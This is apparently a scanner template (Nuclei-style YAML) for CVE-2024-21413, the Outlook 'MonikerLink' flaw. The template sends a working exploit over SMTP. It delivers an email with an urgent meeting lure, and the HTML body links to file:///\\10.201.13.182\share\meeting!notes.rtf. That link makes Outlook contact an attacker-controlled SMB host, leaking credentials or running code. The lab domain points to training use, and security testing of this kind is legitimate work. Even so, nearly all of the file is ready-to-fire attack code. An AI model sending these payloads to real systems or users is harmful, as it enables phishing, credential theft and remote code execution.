id: CVE-2024-21413

info:
  name: Microsoft Outlook RCE
  author: intelligent-ears
  severity: critical
  description: Microsoft Outlook Remote Code Execution via file:// protocol handler
  reference:
    - https://github.com/duy-31/CVE-2024-21413
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-21413
  metadata:
    verified: true
    max-request: 1
  tags: cve,cve2024,outlook,rce,smtp

variables:
  from: "attacker@monikerlink.thm"
  rcpt: "victim@monikerlink.thm"

network:
  - host:
      - "{{Hostname}}"

    port: 25

    inputs:
      - data: "EHLO test.local\r\n"
        read: 1024

      - data: "MAIL FROM:<{{from}}>\r\n"
        read: 1024

      - data: "RCPT TO:<{{rcpt}}>\r\n"
        read: 1024

      - data: "DATA\r\n"
        read: 1024

      - data: |
          From: <{{from}}>
          To: <{{rcpt}}>
          Subject: Important Meeting - Action Required
          Date: Wed, 15 Mar 2024 10:00:00 +0000
          MIME-Version: 1.0
          Content-Type: text/html; charset=utf-8

          <html>
          <body>
          <p>Hello,</p>
          <p>Please review the attached meeting notes:</p>
          <a href="file:///\\10.201.13.182\share\meeting!notes.rtf">Click here for meeting details</a>
          <p>Best regards</p>
          </body>
          </html>

          .

        read: 1024

      - data: "QUIT\r\n"
        read: 1024

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "250 2.0.0"
          - "250 OK"
        condition: or
        part: raw

      - type: word
        words:
          - "250"
        part: raw
        condition: and

    extractors:
      - type: regex
        part: raw
        regex:
          - "250 2\\.0\\.0.*"
          - "250 OK.*"
          - "queued as.*"
